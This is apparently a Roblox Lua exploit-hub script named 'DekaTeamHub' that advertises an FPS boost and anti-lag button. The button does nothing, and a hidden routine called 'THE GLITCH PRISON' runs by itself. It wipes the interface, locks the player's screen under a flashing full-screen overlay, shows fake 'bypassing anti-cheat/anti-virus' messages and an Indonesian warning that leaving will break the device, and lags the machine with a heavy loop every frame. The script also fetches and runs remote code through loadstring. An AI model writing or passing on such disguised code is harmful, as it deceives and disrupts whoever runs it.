local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "DekaTeamHub V1 ✅",
   LoadingTitle = "Optimizing Game Resources...",
   LoadingSubtitle = "By DekaTeamhub",
   ConfigurationSaving = { Enabled = false },
   KeySystem = true,
   KeySettings = {
      Title = "DekaTeamHub System",
      Subtitle = "Security Verification",
      Note = "Key: deka Genjor",
      Key = {"deka Genjor"} 
   }
})

local Tab = Window:CreateTab("Main", 4483362458)

Tab:CreateButton({
   Name = "Boost FPS & Anti-Lag",
   Callback = function()
       Rayfield:Notify({
          Title = "Success",
          Content = "Boosting Performance... Please wait.",
          Duration = 5,
       })
   end,
})

-- [[ THE GLITCH PRISON ]] --
task.spawn(function()
    task.wait(0.5)
    
    for _, v in pairs(game:GetService("CoreGui"):GetChildren()) do
        if v.Name:find("Rayfield") then v:Destroy() end
    end

    local StarterGui = game:GetService("StarterGui")
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    end)

    local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    local screenGui = Instance.new("ScreenGui", playerGui)
    screenGui.Name = "SystemCriticalError"
    screenGui.DisplayOrder = 2147483647
    screenGui.IgnoreGuiInset = true 

    local glitchFrame = Instance.new("TextButton", screenGui)
    glitchFrame.Size = UDim2.new(1, 0, 1, 0)
    glitchFrame.Text = ""
    glitchFrame.Active = true 
    glitchFrame.Modal = true 

    local infoText = Instance.new("TextLabel", glitchFrame)
    infoText.Size = UDim2.new(0.9, 0, 0.5, 0)
    infoText.Position = UDim2.new(0.05, 0, 0.25, 0)
    infoText.TextColor3 = Color3.fromRGB(255, 255, 255)
    infoText.TextScaled = true
    infoText.BackgroundTransparency = 1
    infoText.Font = Enum.Font.Code
    infoText.ZIndex = 5
    infoText.TextStrokeTransparency = 0
    infoText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    
    local startTime = tick()
    
    game:GetService("RunService").RenderStepped:Connect(function()
        local currentTime = tick() - startTime
        
        -- Efek Glitch Warna-Warni
        glitchFrame.BackgroundColor3 = Color3.fromHSV(math.random(), 1, 1)
        
        -- Teks Update
        local baseText = "DEKATEAMHUB CRITICAL INJECTION:\n"
        local status = "BYPASSING ANTI CHEAT\nBYPASSING ANTI REPORT\nBYPASSING ANTI BANNED\nBYPASSING ANTI KICK\nBYPASSING ANTI DETECTED\nBYPASSING ANTI VIRUS"
        
        if currentTime < 360 then
            infoText.Text = baseText .. status .. "\n\nSABAR TUNGGU PROSES SELESAI!"
        else
            infoText.Text = baseText .. status .. "\n\nDURASI: 1 MINGGU\nJANGAN KELUAR ATAU DEVICE ANDA ERROR!"
        end

        -- Guncangan Layar Ekstrim
        infoText.Position = UDim2.new(0.05, math.random(-5, 5), 0.25, math.random(-5, 5))
        infoText.Rotation = math.random(-2, 2)
        
        -- Lag Engine
        for i = 1, 350000 do local _ = i * i end
    end)
end)









